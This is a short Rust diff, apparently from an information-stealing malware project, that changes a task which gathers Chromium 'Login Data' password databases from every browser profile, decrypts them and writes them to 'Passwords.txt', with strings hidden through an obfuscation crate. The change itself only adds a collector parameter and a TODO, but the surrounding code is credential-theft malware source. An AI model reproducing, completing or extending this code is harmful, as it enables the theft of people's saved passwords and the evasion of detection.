@@ -2,6 +2,7 @@ use crate::chromium::{decrypt_data, BrowserData};
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Password};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
+use collector::atomic::AtomicCollector;
 use database::TableRecord;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
@@ -24,7 +25,8 @@ impl PasswordsTask {
 impl Task for PasswordsTask {
     parent_name!("Passwords.txt");
 
-    unsafe fn run(&self, parent: &Path) {
+    // TODO: Impl collector
+    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
         let Some(passwords) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("Login Data"),
